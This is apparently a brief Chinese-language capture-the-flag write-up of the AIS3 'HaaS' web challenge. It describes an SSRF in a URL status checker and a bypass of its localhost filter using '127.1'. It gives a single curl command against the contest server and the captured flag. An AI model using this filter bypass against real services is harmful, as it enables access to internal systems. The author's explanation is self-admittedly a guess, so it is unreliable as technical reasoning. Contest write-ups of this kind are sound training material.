# WEB - HaaS
## 題目解析
給一個輸入欄位可以放網址，確認網站狀態，很明顯就是 SSRF

## 嘗試
直接丟 127.0.0.1 或 localhost 會說不行，但是 127.1 是可以的

## 解法
其實我也不懂這題解出來是什麼原理，我猜是只要讓服務壞掉就可以拿到 flag 了(?

* `curl -v -X POST http://quiz.ais3.org:7122/haas -d "url=http://127.1&status=300"`
* flag: `AIS3{V3rY_v3rY_V3ry_345Y_55rF}`

